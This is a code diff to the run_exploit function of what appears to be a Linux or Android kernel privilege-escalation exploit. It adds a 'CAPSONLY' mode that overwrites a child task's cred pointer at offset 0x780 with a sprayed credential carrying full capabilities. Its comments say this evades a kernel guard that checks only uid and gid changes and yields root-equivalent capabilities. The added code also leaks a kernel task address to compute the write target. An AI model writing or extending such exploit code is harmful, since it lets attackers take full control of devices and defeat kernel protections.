@@ -3733,6 +3733,17 @@ int run_exploit(int argc, char **argv) {
         proof_val = 0;
         desc = "SLIDE_ZERO data-only";
       }
+    } else if (env_flag("MODE4_CAPSONLY", 0) && g_cred_copy) {
+      /*
+       * CAPSONLY (diyiqiuye PFEM10 recipe): write task->cred(+0x780) =
+       * our spray-page caps-cred (uid=2000 + 5×full caps). The guard
+       * checks ONLY uid/euid/gid/egid DROP edges and NEVER reads caps.
+       * uid stays 2000 → no kill → root-equivalent capabilities.
+       * Target = child_task + TASK_CRED_OFF (pselect_write_target).
+       */
+      proof_tgt = 0; /* late-bound: the stamp uses pselect_write_target */
+      proof_val = 0;
+      desc = "CAPSONLY (task->cred = caps-cred, guard-safe)";
     } else if (env_flag("MODE4_PIPE_FLAG", 0) && pipebuf_page_base) {
       /*
        * PIPE-FLAG (polygraphene S26 recipe; 09-14 pivot from dead configfs):
@@ -3775,6 +3786,26 @@ int run_exploit(int argc, char **argv) {
     durable_stage("write_proof_enter");
     slab_drain();
     TIMER("pre-WRITE_PROOF drain");
+    /* CAPSONLY: late-bind the target to the child's task+0x780 now that
+     * the child exists (spawned below) — use the leaked child task */
+    if (env_flag("MODE4_CAPSONLY", 0) && !proof_tgt) {
+      struct child_pipes cpipes;
+      pid_t cap_child = spawn_child(&cpipes);
+      if (cap_child > 0) {
+        uintptr_t child_task = 0;
+        read(cpipes.task_r, &child_task, sizeof(child_task));
+        close(cpipes.task_r);
+        if (child_task) {
+          proof_tgt = child_task + TASK_CRED_OFF;
+          pr_info("CAPSONLY target: child_task=%016zx +0x780 = %016zx\n",
+                  child_task, proof_tgt);
+        } else {
+          pr_error("CAPSONLY: child task leak failed\n");
+          kill(cap_child, SIGKILL);
+          waitpid(cap_child, NULL, 0);
+        }
+      }
+    }
     /* mode=4 so fops packing + MODE4_ARISTOTLE stamp apply */
     set_pselect_write_mode(proof_tgt, proof_val, 4);
     if (!proof_val && (!strcmp(tgt_name, "fops") || !strcmp(tgt_name, "misc"))) {
